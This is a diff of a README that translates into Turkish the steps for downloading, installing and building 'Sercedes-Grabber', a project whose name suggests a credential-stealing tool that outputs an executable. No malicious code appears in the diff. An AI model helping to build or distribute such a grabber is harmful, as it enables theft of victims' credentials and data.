@@ -49,9 +49,9 @@
 <details>
     <summary>Anlamayanlar İçin</summary>
     <ol>
-        <li><a href="https://github.com/Sercedes001/Sercedes-Grabber/archive/refs/heads/main.zip">Download source code zip</a></li>
-        <li>Extract zip</li>
-        <li>Run <code>install_python.bat</code></li>
+        <li><a href="https://github.com/Sercedes001/Sercedes-Grabber/archive/refs/heads/main.zip">Kaynak kodu zip'ini indir zip</a></li>
+        <li>Klasöre Çıkart</li>
+        <li> Çalıştır → <code>install_python.bat</code></li>
         <li>Run the builder by double clicking the <code>build.bat</code> file</li>
         <li>Follow instructions in builder and your exe will be in the same folder as <code>built.exe</code></li>
     </ol>
